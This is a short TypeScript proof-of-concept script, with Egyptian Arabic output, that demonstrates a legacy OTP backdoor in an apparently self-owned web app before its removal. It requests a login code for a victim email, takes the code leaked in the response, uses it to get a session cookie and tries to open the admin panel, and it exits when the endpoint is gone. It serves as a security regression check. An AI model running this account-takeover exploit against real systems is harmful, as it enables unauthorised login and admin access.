/** Demonstrates the legacy OTP backdoor before it is removed. */
const B = process.argv[2] ?? "http://localhost:3000";
const VICTIM = process.argv[3] ?? "tawwarni@gmail.com";

(async () => {
  const r1 = await fetch(`${B}/api/auth/request-code`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: VICTIM }),
  });

  if (r1.status === 404 || r1.status === 410) {
    console.log(`✓ /api/auth/request-code اتشال (${r1.status}) — الباب مقفول`);
    process.exit(0);
  }

  const d1 = (await r1.json()) as { devCode?: string };
  console.log(`1) request-code → ${r1.status} ${JSON.stringify(d1)}`);

  if (!d1.devCode) {
    console.log("   مفيش كود مكشوف في الرد");
    process.exit(0);
  }

  const r2 = await fetch(`${B}/api/auth/verify-code`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: VICTIM, code: d1.devCode }),
  });

  const cookies = r2.headers.getSetCookie?.() ?? [];
  const session = cookies.find((c) => c.startsWith("tawwerni_session"));
  console.log(`2) verify-code → ${r2.status}`);
  console.log(`3) جلسة دخول: ${session ? "اتسلّمت ✗✗✗" : "مفيش ✓"}`);

  if (session) {
    const jar = session.split(";")[0];
    const r3 = await fetch(`${B}/admin`, { headers: { Cookie: jar } });
    const html = await r3.text();
    const blocked = html.includes("ادخل بحساب المالك");
    console.log(`4) فتح /admin: ${blocked ? "اترفض ✓" : "دخل لوحة الإدارة ✗✗✗"}`);
  }
})();
